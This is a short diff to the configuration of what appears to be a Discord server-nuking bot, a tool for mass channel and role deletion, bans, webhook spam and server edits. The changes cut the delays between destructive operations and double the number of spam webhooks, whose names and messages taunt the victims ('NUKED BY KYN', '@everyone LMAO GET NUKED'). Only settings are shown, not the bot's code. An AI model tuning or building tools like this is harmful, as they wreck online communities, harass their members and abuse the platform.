@@ -27,15 +27,15 @@ module.exports = {
         ],
         spamRounds: 200,
         timing: {
-            channelCreateDelay: 500,
-            channelDeleteDelay: 500,
+            channelCreateDelay: 300,
+            channelDeleteDelay: 300,
             roleCreateDelay: 500,
             roleDeleteDelay: 500,
             banDelay: 1000,
             messageDeleteDelay: 500,
             webhookCreateDelay: 500,
-            serverEditDelay: 2000,
-            spamRoundDelay: 500,
+            serverEditDelay: 1000,
+            spamRoundDelay: 300,
             initialOperationDelay: 3000
         },
         behavior: {
@@ -50,7 +50,7 @@ module.exports = {
             leaveServerAfterNuke: false
         },
         webhooks: {
-            createCount: 5,
+            createCount: 10,
             names: ["NUKED BY KYN", "GET WRECKED"],
             messages: ["@everyone LMAO GET NUKED", "@here KYN OWNS YOU"]
         },
@@ -96,7 +96,7 @@ module.exports = {
                 "# YOU CAN'T BLOCK ME {user}"
             ],
             addRandomText: true,
-            useEmbeds: false
+            useEmbeds: true
         }
     },
 
